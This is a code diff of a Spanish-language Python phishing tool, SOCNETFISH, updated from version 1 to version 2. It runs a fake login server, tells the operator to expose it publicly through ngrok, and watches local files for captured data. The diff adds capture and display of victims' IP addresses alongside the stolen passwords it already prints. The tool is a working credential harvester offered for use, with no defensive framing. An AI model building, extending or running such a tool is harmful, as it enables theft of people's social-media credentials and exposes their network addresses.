@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-#SOCNETFISH V01
+#SOCNETFISH V02
 #Crate by WH117
 
 import os
@@ -22,8 +22,9 @@ class hunter():
         resInput = input("Se precionó Ctrl+c. ¿Desea terminar Socnetfish ahora? y/n: ");
         if (resInput == 'y'):
             print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
+            os.system('clear')
             exit(0)
-    
+
     signal(SIGINT, handler)
 
     def banner(self):
@@ -98,6 +99,7 @@ class hunter():
             self.runingServerPhish(self.routePshih)
         elif (numSelect == "0"):
             print(Back.RED + Fore.WHITE + "\n Saliendo de la aplicaicón " + Fore.RESET + Back.RESET)
+            os.system('clear')
             exit(0)
         else:
             print(Fore.RED + "SELECCIÓN NO ENCONTRADA" + Fore.RESET)
@@ -109,24 +111,50 @@ class hunter():
         print(Fore.YELLOW + "A CONTINUACIÓN EJECUTE EL SIGUIENTE COMANDO EN UNA NUEVA VENTANA" + Fore.RESET)
         print(Fore.BLUE + "./ngrok http 8080" + Fore.RESET)
         print("EN ESPERA DE UNA CONTRASEÑA")
+
         self.passFile = "usernames.txt"
+        self.ipFile = "ip.txt"
+
         if (os.path.isfile(self.passFile) == False):
             print(Fore.YELLOW + "CREANDO ARCHIVO USERNAMES.TXT" + Fore.RESET)
             os.system("touch " + self.passFile)
             print(Fore.GREEN + "ARCHIVO CREADO CORRECTAMENTE" + Fore.RESET)
+
         self.tamArchivoInicial = os.path.getsize(self.passFile)
+
+        if (os.path.isfile(self.ipFile) == False):
+            print(Fore.YELLOW + "CREANDO ARCHIVO IP.TXT" + Fore.RESET)
+            os.system("touch " + self.ipFile)
+            print(Fore.GREEN + "ARCHIVO CREADO CORRECTAMENTE" + Fore.RESET)
+
+        self.tamArchivoInicialIP = os.path.getsize(self.ipFile)
+
         while(True):
             self.tamArchivoActual = os.path.getsize(self.passFile)
+            self.tamArchivoActualIP = os.path.getsize(self.ipFile)
+
             self.fileAccount = open(self.passFile, 'r')
+            self.fileIp = open(self.ipFile, 'r')
+
             self.readFileAccount = self.fileAccount.read()
-            if (self.tamArchivoActual > self.tamArchivoInicial):
+            self.readFileIp = self.fileIp.read()
+
+            if (self.tamArchivoActual > self.tamArchivoInicial and self.tamArchivoActualIP > self.tamArchivoInicialIP):
                 os.system("clear")
                 print(Fore.GREEN + "----- CONTRASEÑA CAPTURADA -----" + Fore.RESET)
                 print(Fore.CYAN + self.readFileAccount + Fore.RESET)
+
+                print(Fore.GREEN + "***** IP CAPTURADA *****" + Fore.RESET)
+                print(Fore.CYAN + self.readFileIp + Fore.RESET)
+
                 self.fileAccount.close()
+                self.fileIp.close()
+
                 self.tamArchivoInicial = self.tamArchivoActual
+                self.tamArchivoInicialIP = self.tamArchivoActualIP
             else:
                 self.fileAccount.close()
+                self.fileIp.close()
 
 if __name__ == '__main__':
     h = hunter()
